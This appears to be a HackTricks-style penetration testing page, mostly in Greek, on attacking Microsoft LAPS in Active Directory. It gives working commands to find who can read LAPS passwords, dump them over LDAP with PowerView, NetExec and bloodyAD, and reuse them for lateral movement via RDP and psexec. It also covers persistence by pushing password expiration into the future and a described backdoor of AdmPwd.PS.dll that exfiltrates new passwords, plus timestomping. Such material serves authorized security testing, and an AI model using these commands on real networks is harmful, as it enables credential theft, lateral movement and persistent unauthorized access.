# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Υπάρχουν επί του παρόντος **2 LAPS flavours** που μπορεί να συναντήσεις κατά τη διάρκεια ενός assessment:

- **Legacy Microsoft LAPS**: αποθηκεύει τον local administrator password στο **`ms-Mcs-AdmPwd`** και τον χρόνο λήξης στο **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (ενσωματωμένο στο Windows από τα April 2023 updates): μπορεί ακόμα να μιμηθεί legacy mode, αλλά σε native mode χρησιμοποιεί **`msLAPS-*`** attributes, υποστηρίζει **password encryption**, **password history**, και **DSRM password backup** για domain controllers.

Το LAPS έχει σχεδιαστεί για να διαχειρίζεται **local administrator passwords**, κάνοντάς τα **unique, randomized, and frequently changed** σε domain-joined computers. Αν μπορείς να διαβάσεις αυτά τα attributes, συνήθως μπορείς να **pivot as the local admin** στο affected host. Σε πολλά environments, το ενδιαφέρον μέρος δεν είναι μόνο η ανάγνωση του ίδιου του password, αλλά και το να βρεις **who was delegated access** στα password attributes.

### Legacy Microsoft LAPS attributes

Στα computer objects του domain, η υλοποίηση του legacy Microsoft LAPS προσθέτει δύο attributes:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Το native Windows LAPS προσθέτει αρκετά νέα attributes στα computer objects:

- **`msLAPS-Password`**: clear-text password blob αποθηκευμένο ως JSON όταν το encryption δεν είναι ενεργοποιημένο
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data για domain controllers
- **`msLAPS-CurrentPasswordVersion`**: GUID-based version tracking που χρησιμοποιείται από νεότερη rollback-detection logic (Windows Server 2025 forest schema)

Όταν το **`msLAPS-Password`** είναι readable, η τιμή είναι ένα JSON object που περιέχει το account name, τον χρόνο update και το clear-text password, για παράδειγμα:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Έλεγχος αν είναι ενεργοποιημένο
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

Μπορείς να **κατεβάσεις το raw LAPS policy** από `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` και μετά να χρησιμοποιήσεις το **`Parse-PolFile`** από το πακέτο [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) για να μετατρέψεις αυτό το αρχείο σε μορφή αναγνώσιμη από άνθρωπο.

### Legacy Microsoft LAPS PowerShell cmdlets

Αν το legacy LAPS module είναι εγκατεστημένο, τα ακόλουθα cmdlets είναι συνήθως διαθέσιμα:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Το Native Windows LAPS έρχεται με ένα νέο PowerShell module και νέα cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
A few operational details matter here:

- **`Get-LapsADPassword`** automatically handles **legacy LAPS**, **clear-text Windows LAPS**, and **encrypted Windows LAPS**.
- If the password is encrypted and you can **read** but not **decrypt** it, the cmdlet returns metadata such as **`Source`**, **`DecryptionStatus`**, and **`AuthorizedDecryptor`** even when it can't return the clear-text password.
- In **encrypted Windows LAPS**, **read permission** and **decrypt permission** are **different controls**. Having OU / object read access doesn't automatically mean you can decrypt **`msLAPS-EncryptedPassword`**.
- **Password history** is only available when **Windows LAPS encryption** is enabled.
- On domain controllers, the returned source can be **`EncryptedDSRMPassword`**.

This is useful during an assessment because the **`AuthorizedDecryptor`** field tells you **which user or group the blob was encrypted for**, often turning a failed password read into a new privilege-escalation target.

### PowerView / LDAP

**PowerView** can also be used to find out **who can read the password and read it**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Εάν το **`msLAPS-Password`** είναι αναγνώσιμο, κάνε parse το returned JSON και εξήγαγε το **`p`** για τον κωδικό πρόσβασης και το **`n`** για το όνομα του managed local admin account.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Αυτό το πεδίο **`n`** έχει σημασία σε νεότερες εγκαταστάσεις επειδή η **Windows LAPS automatic account management** μπορεί να στοχεύσει έναν **custom account** αντί για τον ενσωματωμένο **`Administrator`**, και τα νεότερα συστήματα **Windows 11 24H2 / Windows Server 2025** μπορούν ακόμη και να **randomize** το όνομα αυτού του account.

### Linux / remote tooling

Τα σύγχρονα εργαλεία υποστηρίζουν τόσο το legacy Microsoft LAPS όσο και το Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Σημειώσεις:

- Πρόσφατα builds του **NetExec** υποστηρίζουν τα **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, και **`msLAPS-EncryptedPassword`**.
- Το **`pyLAPS`** εξακολουθεί να είναι χρήσιμο για το **legacy Microsoft LAPS** από Linux, αλλά στοχεύει μόνο το **`ms-Mcs-AdmPwd`**.
- Νεότερα cross-platform εργαλεία όπως τα **`LAPS4LINUX`**, εργαλεία βασισμένα στο **`dpapi-ng`**, και πρόσφατα workflows του **NetExec** μπορούν επίσης να χειριστούν το **native Windows LAPS** από hosts που δεν είναι Windows.
- Αν το περιβάλλον χρησιμοποιεί **encrypted Windows LAPS**, ένα απλό LDAP read δεν αρκεί· χρειάζεται επίσης να είσαι **authorized decryptor** (ή ισοδύναμο υλικό αποκρυπτογράφησης, όπως offline domain DPAPI-NG root key material).
- Στο **Windows 11 24H2 / Windows Server 2025**, μην υποθέτεις ότι ο managed local admin είναι πάντα **`Administrator`**. Το Automatic account management μπορεί να δημιουργήσει ένα custom account και προαιρετικά να κάνει randomize το όνομά του, οπότε ανακάλυψε πρώτα το όνομα του account μέσω **`n`** / **`Account`** πριν χρησιμοποιήσεις το **`--laps`** σε μεγάλη κλίμακα.

### Directory synchronization abuse

Αν έχεις domain-level δικαιώματα **directory synchronization** αντί για άμεσο read access σε κάθε computer object, το LAPS μπορεί να είναι ακόμα ενδιαφέρον.

Ο συνδυασμός των **`DS-Replication-Get-Changes`** με **`DS-Replication-Get-Changes-In-Filtered-Set`** ή **`DS-Replication-Get-Changes-All`** μπορεί να χρησιμοποιηθεί για να συγχρονίσει **confidential / RODC-filtered** attributes όπως το legacy **`ms-Mcs-AdmPwd`**. Το BloodHound το μοντελοποιεί αυτό ως **`SyncLAPSPassword`**. Δες το [DCSync](dcsync.md) για το υπόβαθρο των replication-rights.

## LAPSToolkit

Το [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) διευκολύνει την απαρίθμηση του LAPS με αρκετές functions.\
Μία είναι το parsing των **`ExtendedRights`** για **όλους τους computers με ενεργοποιημένο LAPS.** Αυτό δείχνει **groups** που έχουν συγκεκριμένα **delegated to read LAPS passwords**, τα οποία συχνά είναι users σε protected groups.\
Ένα **account** που έχει **joined a computer** σε domain λαμβάνει `All Extended Rights` πάνω σε αυτόν τον host, και αυτό το right δίνει στο **account** τη δυνατότητα να **read passwords**. Η απαρίθμηση μπορεί να δείξει ένα user account που μπορεί να διαβάσει το LAPS password σε έναν host. Αυτό μπορεί να μας βοηθήσει να **στοχεύσουμε συγκεκριμένους AD users** που μπορούν να διαβάσουν LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping LAPS Passwords With NetExec / CrackMapExec

Αν δεν έχετε διαδραστικό PowerShell, μπορείτε να κάνετε abuse αυτό το privilege απομακρυσμένα μέσω LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Αυτό κάνει dump όλα τα LAPS secrets που μπορεί να διαβάσει ο χρήστης, επιτρέποντάς σας να μετακινηθείτε lateral με διαφορετικό local administrator password.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Ημερομηνία λήξης

Μόλις αποκτήσεις admin, είναι δυνατό να **obtains the passwords** και να **prevent** ένα μηχάνημα από το να **updating** το **password** του, **ρυθμίζοντας την ημερομηνία λήξης στο μέλλον**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Το Native Windows LAPS χρησιμοποιεί **`msLAPS-PasswordExpirationTime`** αντί για αυτό:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Ο κωδικός πρόσβασης θα εξακολουθεί να αλλάζει αν ένας **admin** χρησιμοποιήσει το **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, ή αν είναι ενεργοποιημένο το **Do not allow password expiration time longer than required by policy**.

### Snapshot rollback caveat on newer Windows LAPS

Παλαιότερα snapshot / image rollback tricks είναι **λιγότερο αξιόπιστα** απέναντι σε πρόσφατα **Windows LAPS** deployments. Στα **Windows 11 24H2 / Windows Server 2025**, αν το forest schema περιλαμβάνει το **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), ο client συγκρίνει ένα τοπικά cached GUID με την τιμή που είναι αποθηκευμένη στο AD και **αλλάζει αμέσως τον κωδικό πρόσβασης** όταν ένα rollback δημιουργεί μια **torn state**.

Στην πράξη, αυτό σημαίνει ότι η snapshot-based persistence ή οι προσπάθειες να αναστηθεί ένας παλαιότερος γνωστός local admin password μπορούν να καούν γρήγορα αντί να επιβιώσουν μέχρι την επόμενη κανονική expiration.

Αυτή η προστασία ισχύει μόνο για **AD-backed Windows LAPS** και εξακολουθεί να εξαρτάται από το αν το reverted machine μπορεί να **authenticate back to AD**. Αν το machine δεν μπορεί να μιλήσει πλέον με το AD, το **password history** ή το **AD backup access** ίσως ακόμη σώσουν την κατάσταση.

### Automatic account management tamper caveat

Όταν είναι ενεργοποιημένο το **automatic account management**, το Windows LAPS ελέγχει το lifecycle του managed local admin account. Απρόσμενες προσπάθειες να γίνει rename, reconfigure ή γενικά tamper με αυτό το account μπορούν να απορριφθούν με **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, οπότε η persistence που βασίζεται σε σιωπηλή τροποποίηση του managed LAPS account είναι λιγότερο αξιόπιστη σε νεότερα endpoints.

### Recovering historical passwords from AD backups

Όταν είναι ενεργοποιημένο το **Windows LAPS encryption + password history**, τα mounted AD backups μπορούν να γίνουν μια επιπλέον πηγή secrets. Αν μπορείς να έχεις πρόσβαση σε ένα mounted AD snapshot και να χρησιμοποιήσεις **recovery mode**, μπορείς να κάνεις query παλαιότερους stored passwords χωρίς να μιλάς με ένα live DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Αυτό είναι κυρίως σχετικό κατά τη διάρκεια **AD backup theft**, **offline forensics abuse**, ή **disaster-recovery media access**.

### Backdoor

Ο αρχικός πηγαίος κώδικας για το legacy Microsoft LAPS μπορεί να βρεθεί [εδώ](https://github.com/GreyCorbel/admpwd), επομένως είναι δυνατό να τοποθετηθεί ένα backdoor στον κώδικα (μέσα στη μέθοδο `Get-AdmPwdPassword` στο `Main/AdmPwd.PS/Main.cs` για παράδειγμα) που κατά κάποιον τρόπο θα **exfiltrate new passwords or store them somewhere**.

Έπειτα, κάνε compile το νέο `AdmPwd.PS.dll` και ανέβασέ το στο μηχάνημα στο `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (και άλλαξε τον χρόνο τροποποίησης).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
